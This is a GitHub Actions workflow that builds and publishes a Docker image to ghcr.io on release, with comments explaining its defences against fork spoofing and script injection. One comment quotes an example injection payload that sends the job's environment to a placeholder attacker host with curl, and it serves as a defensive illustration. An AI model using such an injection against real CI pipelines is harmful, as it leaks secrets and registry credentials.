name: Docker Release

on:
  # Primary trigger: react to release-please (BSOD-257) creating a GitHub
  # Release. The `release: published` event below covers hand-created
  # releases; the `workflow_run` listener below covers release-please,
  # because GitHub Actions deliberately suppresses `release: published`
  # events that are emitted by a workflow using `secrets.GITHUB_TOKEN`
  # (the anti-recursion policy documented at
  # https://docs.github.com/en/actions/security-guides/automatic-token-authentication#using-the-github_token-in-a-workflow).
  # Without this second trigger, every release-please release would
  # silently skip Docker image publication (BSOD-357).
  workflow_run:
    workflows: ["Release Please"]
    types: [completed]
  # Fallback for hand-published GitHub Releases (e.g. emergency re-runs
  # by a maintainer). The idempotency check on the version tag handles
  # the rare case where both this and `workflow_run` fire for the same
  # release.
  release:
    types: [published]
  workflow_dispatch:
    inputs:
      tag_name:
        description: "Git tag name to publish (e.g. v0.1.0). Must already exist in the repository."
        required: true
        type: string
      source_branch:
        description: "Branch the tag was cut from. Set to 'main' to also push a `latest` alias; leave empty for non-main releases."
        required: false
        default: ""
        type: string

permissions:
  contents: read
  packages: write

jobs:
  docker:
    name: Build & push image
    runs-on: ubuntu-latest
    # Insurance against a hung buildx/registry call. The full flow
    # (clone + build + push + tag resolution + idempotency check)
    # should finish well under this; 15 min is the action default.
    timeout-minutes: 15
    # Skip the whole job when the upstream `Release Please` workflow
    # completed without producing a release (no conventional commits
    # since the last tag, etc.). workflow_dispatch and direct
    # `release: published` always run.
    #
    # Security: a `workflow_run` event fires for runs of the named
    # workflow in FORKS of this repository too (see
    # https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow_run).
    # Although fork runs don't have access to secrets, the workflow
    # payload is still attacker-controllable (any field on the run
    # object, including `outputs.*`). Restrict the trigger to runs
    # that originated in our own repository (`head_repository.full_name`
    # == `repository.full_name`) and to a single named workflow so a
    # malicious fork can't name its workflow "Release Please" and
    # inject a crafted `tag_name`/`sha` output. SonarCloud rule
    # githubactions:S7631 (BSOD-357).
    if: |
      github.event_name == 'workflow_dispatch' ||
      github.event_name == 'release' ||
      (github.event_name == 'workflow_run' &&
       github.event.workflow_run.conclusion == 'success' &&
       github.event.workflow_run.head_repository.full_name == github.repository.full_name &&
       github.event.workflow_run.name == 'Release Please' &&
       github.event.workflow_run.outputs.releases_created == 'true')
    steps:
      - name: Resolve event inputs
        id: inputs
        env:
          # Thread ALL untrusted inputs through env vars rather than
          # interpolating them into `run:` shell directly. This is the
          # standard GitHub-Actions mitigation for script injection:
          # `${{ inputs.X }}` would let a malicious caller (anyone with
          # workflow_dispatch rights) break out of the string with
          # `"; curl evil.example --data "$(env)"; echo "` and run
          # arbitrary shell in a job that holds packages: write and
          # ghcr.io credentials.
          EVENT_NAME: ${{ github.event_name }}
          RELEASE_TAG_NAME: ${{ github.event.release.tag_name }}
          RELEASE_TARGET_COMMITISH: ${{ github.event.release.target_commitish }}
          RELEASE_PRERELEASE: ${{ github.event.release.prerelease }}
          WORKFLOW_RUN_TAG_NAME: ${{ github.event.workflow_run.outputs.tag_name }}
          WORKFLOW_RUN_SHA: ${{ github.event.workflow_run.outputs.sha }}
          WORKFLOW_RUN_PRERELEASE: ${{ github.event.workflow_run.outputs.prerelease }}
          WORKFLOW_RUN_HEAD_BRANCH: ${{ github.event.workflow_run.head_branch }}
          DISPATCH_TAG_NAME: ${{ inputs.tag_name }}
          DISPATCH_SOURCE_BRANCH: ${{ inputs.source_branch }}
        run: |
          set -euo pipefail
          if [ "$EVENT_NAME" = "release" ]; then
            # `target_commitish` is the branch or commit the release-please
            # tag was cut from. Treat only an explicit branch reference
            # to `main` as "on main" so we never push `latest` from a
            # hotfix or back-port branch. release-please with the default
            # squash strategy reports `main` for normal releases.
            if [ "$RELEASE_TARGET_COMMITISH" = "main" ]; then
              ON_MAIN="true"
            else
              ON_MAIN="false"
            fi
            {
              echo "tag_name=$RELEASE_TAG_NAME"
              echo "prerelease=$RELEASE_PRERELEASE"
              echo "on_main=$ON_MAIN"
              echo "commit_sha="
            } >> "$GITHUB_OUTPUT"
          elif [ "$EVENT_NAME" = "workflow_run" ]; then
            # The `releases_created` job-level guard on this workflow
            # already filters out the no-release case, so by the time we
            # get here release-please has stamped a tag. The `tag_name`
            # output is the exact string release-please used for the
            # GitHub Release (e.g. `v0.5.0`); the `sha` output is the
            # commit release-please tagged. The job-level `if` already
            # guarantees `releases_created == 'true'`, so we don't need
            # a second guard here.
            #
            # `WORKFLOW_RUN_TAG_NAME` may legitimately be empty in the
            # corner case where a future release-please version stops
            # emitting it; treat that as a hard failure rather than
            # silently pushing a bogus `:latest` retag.
            if [ -z "$WORKFLOW_RUN_TAG_NAME" ]; then
              echo "::error::workflow_run completed with releases_created=true but the upstream workflow emitted no tag_name output. Refusing to publish an unversioned image." >&2
              exit 1
            fi
            if [ "$WORKFLOW_RUN_HEAD_BRANCH" = "main" ]; then
              ON_MAIN="true"
            else
              ON_MAIN="false"
            fi
            # Pass through the prerelease flag from the upstream
            # `Resolve release info` step in release-please.yml. If
            # the upstream emitted an empty `prerelease` (the
            # pre-release-please-outputs-declaration world of
            # v5.0.0), `WORKFLOW_RUN_PRERELEASE` is also empty and
            # the script (`scripts/resolve-docker-tags.mjs`) falls
            # back to deriving prerelease from the tag's semver —
            # which means `v1.0.0-rc.1` will NOT push `latest` even
            # from a release-please workflow_run that came from
            # main. (BSOD-463)
            {
              echo "tag_name=$WORKFLOW_RUN_TAG_NAME"
              echo "prerelease=$WORKFLOW_RUN_PRERELEASE"
              echo "on_main=$ON_MAIN"
              echo "commit_sha=$WORKFLOW_RUN_SHA"
            } >> "$GITHUB_OUTPUT"
          else
            # workflow_dispatch: there is no GitHub-emitted prerelease
            # flag, so we leave PRERELEASE_FLAG empty. The script
            # (`scripts/resolve-docker-tags.mjs`) interprets an empty /
            # missing `--prerelease` as "derive from the tag's semver",
            # which means a re-publish of `v1.0.0-rc.1` will NOT push
            # `latest` even if source_branch=main.
            if [ "$DISPATCH_SOURCE_BRANCH" = "main" ]; then
              ON_MAIN="true"
            else
              ON_MAIN="false"
            fi
            {
              echo "tag_name=$DISPATCH_TAG_NAME"
              echo "prerelease="
              echo "on_main=$ON_MAIN"
              echo "commit_sha="
            } >> "$GITHUB_OUTPUT"
          fi

      - name: Log resolved inputs
        env:
          # Thread step outputs through env vars rather than interpolating
          # them into the `run:` shell. `steps.inputs.outputs.tag_name` is
          # set verbatim from the dispatch input one step earlier, so it
          # is transitively untrusted — interpolating it here would
          # reintroduce the script-injection vector the previous commit
          # closed in the "Resolve event inputs" step.
          LOG_TAG_NAME: ${{ steps.inputs.outputs.tag_name }}
          LOG_PRERELEASE: ${{ steps.inputs.outputs.prerelease }}
          LOG_ON_MAIN: ${{ steps.inputs.outputs.on_main }}
          LOG_COMMIT_SHA: ${{ steps.inputs.outputs.commit_sha }}
        run: |
          echo "Resolved Docker image inputs:"
          echo "  tag_name=$LOG_TAG_NAME"
          echo "  prerelease=$LOG_PRERELEASE"
          echo "  on_main=$LOG_ON_MAIN"
          echo "  commit_sha=$LOG_COMMIT_SHA"

      - name: Check out the tagged commit
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          # Check out the tag directly so the image is built from the
          # exact commit release-please tagged, not from a re-fetched
          # `main` HEAD (which may have moved past the release).
          # For the `workflow_run` path the upstream release-please job
          # stamped the SHA onto its `sha` output, so we check that out
          # directly (the tag may not yet be visible on `origin` when
          # this downstream workflow fires, and forcing a tag checkout
          # would race with the upstream's tag push).
          ref: ${{ steps.inputs.outputs.commit_sha || steps.inputs.outputs.tag_name }}
          fetch-depth: 1

      - name: Resolve source commit SHA
        id: source
        run: |
          set -euo pipefail
          SHA=$(git rev-parse HEAD)
          echo "commit_sha=$SHA" >> "$GITHUB_OUTPUT"
          echo "Source commit: $SHA"

      - name: Resolve Docker tags
        id: tags
        env:
          TAG_NAME: ${{ steps.inputs.outputs.tag_name }}
          PRERELEASE: ${{ steps.inputs.outputs.prerelease }}
          ON_MAIN: ${{ steps.inputs.outputs.on_main }}
          IMAGE_OWNER: ${{ github.repository_owner }}
        run: |
          set -euo pipefail
          JSON=$(node scripts/resolve-docker-tags.mjs \
            --tag-name="$TAG_NAME" \
            --prerelease="$PRERELEASE" \
            --on-main="$ON_MAIN")
          echo "Computed tags payload: $JSON"

          {
            echo "Image refs to push:"
            echo "$JSON" | jq -r --arg registry "ghcr.io" \
              --arg owner "$IMAGE_OWNER" \
              --arg name "team-dash" \
              '.tags[] | "  " + "\($registry)/\($owner)/\($name):\(.)"'
          }

          {
            echo "tags_json=$JSON"
            echo "image_refs<<EOF"
            echo "$JSON" | jq -r --arg registry "ghcr.io" \
              --arg owner "$IMAGE_OWNER" \
              --arg name "team-dash" \
              '.tags[] | "\($registry)/\($owner)/\($name):\(.)"'
            echo "EOF"
          } >> "$GITHUB_OUTPUT"

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@37fe631027851001ddb9b187196cc803df7f5f0e # v4.3.0

      - name: Log in to ghcr.io
        uses: docker/login-action@dbcb813823bdd20940b903addbd779551569679f # v4.6.0
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Check whether the version is already published (idempotent)
        id: check
        env:
          VERSION: ${{ fromJSON(steps.tags.outputs.tags_json).version }}
          OWNER: ${{ github.repository_owner }}
        run: |
          set -euo pipefail
          IMAGE="ghcr.io/${OWNER}/team-dash:${VERSION}"
          # `docker buildx imagetools inspect` reads from the same
          # credential store the login-action populated. Exit 0 means the
          # manifest exists; non-zero means the tag is not in the
          # registry.
          #
          # Assumption: `docker/build-push-action` pushes all tags in a
          # single call, so a successful push of `<version>` implies
          # `<major>.<minor>` and `latest` are also live in the registry
          # (same manifest). This is why inspecting just the primary
          # version tag is enough to skip — if a partial push ever
          # somehow lands (network blip mid-call), the next manual
          # workflow_dispatch re-run with a different tag would be the
          # recovery path, not this idempotency guard.
          #
          # BSOD-357: this idempotency check also handles the case
          # where both `release: published` and `workflow_run` fire for
          # the same release (the dual-trigger overlap is documented at
          # the top of this file).
          if docker buildx imagetools inspect "$IMAGE" >/dev/null 2>&1; then
            echo "::notice::Image ${IMAGE} already published; skipping build/push (idempotent no-op)."
            echo "already_published=true" >> "$GITHUB_OUTPUT"
          else
            echo "already_published=false" >> "$GITHUB_OUTPUT"
          fi

      - name: Build & push
        if: steps.check.outputs.already_published != 'true'
        uses: docker/build-push-action@53b7df96c91f9c12dcc8a07bcb9ccacbed38856a # v7.3.0
        with:
          context: .
          file: docker/Dockerfile
          push: true
          tags: ${{ steps.tags.outputs.image_refs }}
          labels: |
            org.opencontainers.image.title=team-dash
            org.opencontainers.image.version=${{ fromJSON(steps.tags.outputs.tags_json).version }}
            org.opencontainers.image.source=${{ github.server_url }}/${{ github.repository }}
            org.opencontainers.image.revision=${{ steps.source.outputs.commit_sha }}
          cache-from: type=gha
          cache-to: type=gha,mode=max
